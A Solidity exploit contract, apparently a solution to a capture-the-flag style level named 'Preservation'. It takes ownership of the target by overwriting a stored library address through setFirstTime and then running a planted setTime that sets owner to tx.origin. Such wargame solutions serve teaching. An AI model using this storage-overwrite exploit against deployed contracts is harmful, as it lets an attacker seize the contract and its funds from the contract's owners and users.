// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Level.sol";

contract Attacker {
    
    Preservation target;
    MaliciousInjection injection;

    constructor(address _target) {
        target = Preservation(_target);
        injection = new MaliciousInjection();
    }

    function attack() public {
        //type-cast a malicious address to uint
        uint256 encodedAddress = uint256(uint160(address(injection)));
        //call the setFirstTime function with the uint-ed address
        target.setFirstTime(encodedAddress);
         //call the function again, this time it will execute malicious code
        target.setFirstTime(1);
    }

}

contract MaliciousInjection {
    address public dummyAddress;
    address public dummyAddress2;
    address public owner;
    function setTime(uint256 dummy) public {
        owner = tx.origin;
    }

}